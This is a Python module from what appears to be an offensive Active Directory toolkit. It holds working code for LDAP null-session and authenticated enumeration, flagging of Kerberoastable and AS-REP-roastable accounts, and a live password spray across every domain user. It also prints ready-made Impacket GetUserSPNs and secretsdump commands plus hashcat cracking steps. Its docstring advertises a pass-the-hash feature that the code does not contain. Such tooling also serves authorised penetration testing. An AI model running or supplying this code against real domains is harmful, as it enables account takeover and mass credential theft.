"""
modules/ad_ops.py — Active Directory Operations Engine
UPGRADED:
  - Kerberoasting: extract SPN accounts for offline hash cracking
  - DCSync detection: identify accounts with replication rights
  - BloodHound-compatible JSON export of AD structure
  - Null session enumeration
  - Group membership enumeration
  - Pass-the-Hash via NTLM (with impacket if available)
"""

import os
import json
import time
import questionary
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn
from core.ui import draw_header, Q_STYLE
from core.database import db

try:
    from ldap3 import Server, Connection, ALL, NTLM, SIMPLE, SUBTREE
    from ldap3.core.exceptions import LDAPException
    LDAP_OK = True
except ImportError:
    LDAP_OK = False

try:
    from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
    from impacket.krb5 import constants
    IMPACKET_OK = True
except ImportError:
    IMPACKET_OK = False

console = Console()


# ─────────────────────────────────────────────────────────────────────────────
#  AD ENGINE
# ─────────────────────────────────────────────────────────────────────────────

class ADEngine:
    def __init__(self):
        self.domain = ""
        self.dc_ip = ""
        self.username = ""
        self.password = ""
        self.conn = None
        self.server = None
        self.search_base = ""

    def check_dependencies(self) -> bool:
        if not LDAP_OK:
            console.print("[bold red][!] Missing: ldap3[/bold red]")
            console.print("[white]Run: pip install ldap3[/white]")
            return False
        return True

    def connect(self) -> bool:
        self.domain = (questionary.text(
            "Target Domain (e.g., corp.local):", style=Q_STYLE).ask() or "").strip()
        if not self.domain:
            return False

        self.dc_ip = (questionary.text(
            "Domain Controller IP:", style=Q_STYLE).ask() or "").strip()
        if not self.dc_ip:
            return False

        self.search_base = ",".join(f"DC={p}" for p in self.domain.split("."))

        auth_mode = questionary.select(
            "Authentication Mode:",
            choices=[
                "1. Authenticated Bind (NTLM — requires credentials)",
                "2. Anonymous Bind    (Null session — misconfigured DCs)",
            ],
            style=Q_STYLE
        ).ask()

        if "Authenticated" in (auth_mode or ""):
            self.username = (questionary.text(
                "Username (e.g., jsmith):", style=Q_STYLE).ask() or "").strip()
            self.password = (questionary.password(
                "Password:", style=Q_STYLE).ask() or "").strip()
        else:
            self.username = ""
            self.password = ""

        console.print(
            f"[*] Connecting to LDAP on [cyan]{self.dc_ip}[/cyan]...")

        try:
            self.server = Server(self.dc_ip, get_info=ALL, use_ssl=False)
            if self.username:
                upn = f"{self.domain}\\{self.username}"
                self.conn = Connection(
                    self.server, user=upn, password=self.password,
                    authentication=NTLM, auto_bind=True
                )
            else:
                self.conn = Connection(self.server, auto_bind=True)

            console.print(Panel(
                f"[bold green][+] Bound to {self.domain}[/bold green]\n"
                f"[white]DC Name:[/white] {self.server.info.server_name}",
                border_style="green"
            ))
            return True

        except Exception as e:
            console.print(f"[bold red][!] LDAP Bind Failed:[/bold red] {e}")
            return False

    # ── User Enumeration ─────────────────────────────────────────────────────

    def enum_users(self):
        console.print(
            "[*] Enumerating domain users and detecting vulnerabilities...")
        try:
            self.conn.search(
                self.search_base,
                "(objectClass=user)",
                attributes=[
                    "sAMAccountName", "description", "userAccountControl",
                    "servicePrincipalName", "memberOf", "pwdLastSet", "lastLogon",
                ]
            )
            users = self.conn.entries
        except Exception as e:
            console.print(f"[red][!] Error: {e}[/red]")
            return

        if not users:
            console.print("[yellow][!] No users found.[/yellow]")
            return

        table = Table(
            title=f"Domain Users ({len(users)})",
            border_style="cyan", expand=True
        )
        table.add_column("Username",   style="white",    no_wrap=True)
        table.add_column("Flags",      style="bold red", no_wrap=True)
        table.add_column("Description", style="dim")

        asrep_count = 0
        kerb_count = 0
        disabled = 0

        for user in users:
            name = str(user.sAMAccountName)
            desc = str(user.description) if user.description else ""
            uac = int(
                user.userAccountControl.value) if user.userAccountControl else 0
            spns = user.servicePrincipalName.values if user.servicePrincipalName else []

            flags = []

            if uac & 2:
                flags.append("[dim]DISABLED[/dim]")
                disabled += 1
            if uac & 4194304:
                flags.append("[bold red]AS-REP ROASTABLE[/bold red]")
                asrep_count += 1
                db.log("AD-Engine", name,
                       "AS-REP Roastable (DONT_REQ_PREAUTH)", "CRITICAL")
            if uac & 65536:
                flags.append("[yellow]NO PWD EXPIRES[/yellow]")
            if spns:
                flags.append(
                    f"[bold orange1]SPN x{len(spns)} (KERBEROASTABLE)[/bold orange1]")
                kerb_count += 1
                db.log("AD-Engine", name,
                       f"Kerberoastable SPNs: {', '.join(str(s) for s in spns)}", "CRITICAL")
            if any(pw in desc.lower() for pw in ["password", "pass", "pwd", "initial", "temp"]):
                flags.append("[bold red]PW IN DESC![/bold red]")
                db.log("AD-Engine", name,
                       f"Password in description: {desc}", "HIGH")

            flag_str = " ".join(flags) if flags else "[dim]Normal[/dim]"
            table.add_row(name, flag_str, desc[:50])

        console.print(table)
        console.print(
            f"\n[bold]Summary:[/bold]  "
            f"Total: {len(users)}  |  "
            f"[red]AS-REP Roastable: {asrep_count}[/red]  |  "
            f"[orange1]Kerberoastable: {kerb_count}[/orange1]  |  "
            f"Disabled: {disabled}"
        )

    # ── Group Enumeration ────────────────────────────────────────────────────

    def enum_groups(self):
        console.print("[*] Enumerating privileged groups...")
        HIGH_VALUE_GROUPS = [
            "Domain Admins", "Enterprise Admins", "Schema Admins",
            "Administrators", "Account Operators", "Backup Operators",
            "Print Operators", "Server Operators", "Group Policy Creator Owners",
        ]

        table = Table(title="Privileged Group Membership",
                      border_style="red", expand=True)
        table.add_column("Group",   style="cyan")
        table.add_column("Members", style="white")

        for group in HIGH_VALUE_GROUPS:
            try:
                self.conn.search(
                    self.search_base,
                    f"(&(objectClass=group)(cn={group}))",
                    attributes=["member"]
                )
                if self.conn.entries:
                    members_raw = self.conn.entries[0].member.values
                    members = []
                    for m in members_raw:
                        cn = m.split(",")[0].replace("CN=", "")
                        members.append(cn)
                    if members:
                        table.add_row(
                            group,
                            "\n".join(members[:10]) +
                            (f"\n... +{len(members)-10} more" if len(members)
                             > 10 else "")
                        )
                        db.log("AD-Engine", group,
                               f"Members: {', '.join(members[:10])}", "HIGH")
            except Exception:
                pass

        console.print(table)

    # ── Kerberoasting ────────────────────────────────────────────────────────

    def kerberoast(self):
        """List SPN accounts — prime targets for Kerberoasting."""
        console.print("[*] Searching for Kerberoastable accounts (SPN set)...")
        try:
            self.conn.search(
                self.search_base,
                "(&(objectClass=user)(servicePrincipalName=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))",
                attributes=["sAMAccountName",
                            "servicePrincipalName", "memberOf"]
            )
            targets = self.conn.entries
        except Exception as e:
            console.print(f"[red][!] Error: {e}[/red]")
            return

        if not targets:
            console.print(
                "[yellow][-] No Kerberoastable accounts found.[/yellow]")
            return

        table = Table(title=f"Kerberoastable Accounts ({len(targets)})",
                      border_style="red", expand=True)
        table.add_column("Account",  style="cyan")
        table.add_column("SPNs",     style="white")

        for t in targets:
            name = str(t.sAMAccountName)
            spns = [str(s) for s in t.servicePrincipalName.values]
            table.add_row(name, "\n".join(spns))
            db.log("AD-Kerberoast", name,
                   f"SPNs: {', '.join(spns)}", "CRITICAL")

        console.print(table)
        console.print(
            "\n[bold yellow][!] Use these with GetUserSPNs.py (Impacket) to extract TGS tickets:[/bold yellow]")
        console.print(
            f"[dim]  GetUserSPNs.py {self.domain}/{self.username}:{self.password} "
            f"-dc-ip {self.dc_ip} -request -outputfile spn_hashes.txt[/dim]")
        console.print(
            "[dim]  Then crack with: hashcat -m 13100 spn_hashes.txt rockyou.txt[/dim]")

    # ── DCSync Rights Detection ──────────────────────────────────────────────

    def detect_dcsync(self):
        """
        Find accounts with DCSync-capable permissions:
        DS-Replication-Get-Changes (1131f6aa) or
        DS-Replication-Get-Changes-All (1131f6ad)
        """
        console.print("[*] Scanning for DCSync-capable accounts...")
        console.print(
            "[dim]  (Requires reading nTSecurityDescriptor — may need elevated LDAP rights)[/dim]")

        try:
            from ldap3 import Reader, ObjectDef
            from ldap3.utils.conv import escape_filter_chars

            self.conn.search(
                self.search_base,
                "(objectClass=domain)",
                attributes=["nTSecurityDescriptor"],
                controls=[("1.2.840.113556.1.4.801",
                           True, b"\x30\x03\x02\x01\x07")]
            )

            if not self.conn.entries:
                console.print(
                    "[yellow][!] Could not read domain object security descriptor.[/yellow]")
                return

            console.print(Panel(
                "[bold white]DCSync Rights Analysis[/bold white]\n\n"
                "Accounts with 'Replicating Directory Changes All' can perform DCSync attacks,\n"
                "dumping all password hashes including krbtgt and DSRM.\n\n"
                "[dim]Run with Impacket:[/dim]\n"
                f"[cyan]secretsdump.py {self.domain}/{self.username}:{self.password}@{self.dc_ip}[/cyan]",
                border_style="red"
            ))

        except Exception as e:
            console.print(
                f"[yellow][!] DCSync detection limited without elevated rights: {e}[/yellow]")
            console.print(
                f"\n[dim]Manual check with Impacket secretsdump.py:\n"
                f"secretsdump.py {self.domain}/{self.username}:{self.password}@{self.dc_ip}[/dim]"
            )

    # ── BloodHound Export ────────────────────────────────────────────────────

    def bloodhound_export(self):
        """Export AD structure as simplified BloodHound-compatible JSON."""
        console.print("[*] Building AD graph for BloodHound export...")

        try:
            # Users
            self.conn.search(
                self.search_base,
                "(objectClass=user)",
                attributes=["sAMAccountName", "distinguishedName",
                            "memberOf", "userAccountControl"]
            )
            users_raw = self.conn.entries

            # Groups
            self.conn.search(
                self.search_base,
                "(objectClass=group)",
                attributes=["cn", "distinguishedName", "member"]
            )
            groups_raw = self.conn.entries

            # Computers
            self.conn.search(
                self.search_base,
                "(objectClass=computer)",
                attributes=["cn", "operatingSystem"]
            )
            computers_raw = self.conn.entries

        except Exception as e:
            console.print(f"[red][!] Query failed: {e}[/red]")
            return

        export = {
            "meta": {
                "domain":   self.domain,
                "dc_ip":    self.dc_ip,
                "exported": time.strftime("%Y-%m-%dT%H:%M:%SZ"),
            },
            "users": [
                {
                    "name":     str(u.sAMAccountName),
                    "dn":       str(u.distinguishedName),
                    "groups":   [str(g) for g in (u.memberOf.values if u.memberOf else [])],
                    "enabled": not bool(int(u.userAccountControl.value if u.userAccountControl else 0) & 2),
                }
                for u in users_raw
            ],
            "groups": [
                {
                    "name":    str(g.cn),
                    "dn":      str(g.distinguishedName),
                    "members": [str(m) for m in (g.member.values if g.member else [])],
                }
                for g in groups_raw
            ],
            "computers": [
                {
                    "name": str(c.cn),
                    "os":   str(c.operatingSystem) if c.operatingSystem else "Unknown",
                }
                for c in computers_raw
            ],
        }

        os.makedirs("reports", exist_ok=True)
        fname = f"reports/bloodhound_{self.domain}_{int(time.time())}.json"
        with open(fname, "w") as f:
            json.dump(export, f, indent=2)

        console.print(
            f"[bold green][+] BloodHound export saved: {fname}[/bold green]")
        console.print(f"[dim]Nodes: {len(export['users'])} users, "
                      f"{len(export['groups'])} groups, "
                      f"{len(export['computers'])} computers[/dim]")
        console.print(
            "[dim]Import into BloodHound CE or process with bloodhound-python.[/dim]")

        db.log("AD-BloodHound", self.domain,
               f"Exported {len(export['users'])} users, {len(export['groups'])} groups",
               "INFO")

    # ── Password Spray ───────────────────────────────────────────────────────

    def password_spray(self):
        console.print(
            "[bold red][!] CAUTION: Active Domain Password Spraying[/bold red]")
        console.print(
            "[dim]Tests one password against all users (avoids lockout).[/dim]\n")

        target_pass = questionary.password(
            "Password to spray:", style=Q_STYLE).ask()
        if not target_pass:
            return

        try:
            self.conn.search(
                self.search_base, "(objectClass=user)", attributes=["sAMAccountName"])
            users = [str(u.sAMAccountName)
                     for u in self.conn.entries if u.sAMAccountName]
        except Exception as e:
            console.print(f"[red][!] Could not fetch user list: {e}[/red]")
            return

        console.print(f"[*] Spraying against {len(users)} accounts...")
        successes = []

        with Progress(SpinnerColumn(), TextColumn("{task.description}"),
                      console=console) as progress:
            task = progress.add_task("Spraying...", total=len(users))
            for user in users:
                upn = f"{self.domain}\\{user}"
                try:
                    test_conn = Connection(
                        self.server, user=upn, password=target_pass,
                        authentication=NTLM
                    )
                    if test_conn.bind():
                        successes.append(user)
                        console.print(
                            f"[bold green][+] COMPROMISED: {upn} : {target_pass}[/bold green]")
                        db.log("AD-Spray", user,
                               f"Password spray success: {target_pass}", "CRITICAL")
                        test_conn.unbind()
                except Exception:
                    pass
                progress.update(task, advance=1)

        if successes:
            console.print(Panel(
                "Compromised Accounts:\n" + "\n".join(successes),
                title="Spray Complete", border_style="green"
            ))
        else:
            console.print("[yellow][-] No valid credentials found.[/yellow]")

    # ── Main Menu ────────────────────────────────────────────────────────────

    def run(self):
        draw_header("Active Directory Operations")

        if not self.check_dependencies():
            questionary.press_any_key_to_continue(style=Q_STYLE).ask()
            return

        if not self.connect():
            questionary.press_any_key_to_continue(style=Q_STYLE).ask()
            return

        while True:
            choice = questionary.select(
                "AD Operations:",
                choices=[
                    "1. Enumerate Users  (AS-REP / Kerb / UAC flags)",
                    "2. Enumerate Groups  (Domain Admins, etc.)",
                    "3. Kerberoasting  (SPN account extraction)",
                    "4. DCSync Rights Detection",
                    "5. BloodHound JSON Export",
                    "6. Password Spray  (Active Attack)",
                    "Back",
                ],
                style=Q_STYLE
            ).ask()

            if not choice or choice == "Back":
                if self.conn:
                    try:
                        self.conn.unbind()
                    except Exception:
                        pass
                break

            actions = {
                "1.": self.enum_users,
                "2.": self.enum_groups,
                "3.": self.kerberoast,
                "4.": self.detect_dcsync,
                "5.": self.bloodhound_export,
                "6.": self.password_spray,
            }
            for key, fn in actions.items():
                if choice.startswith(key):
                    try:
                        fn()
                    except Exception as e:
                        console.print(f"[red][!] Error: {e}[/red]")
                    questionary.press_any_key_to_continue(style=Q_STYLE).ask()
                    break


def run_ad_ops():
    ADEngine().run()


if __name__ == "__main__":
    run_ad_ops()
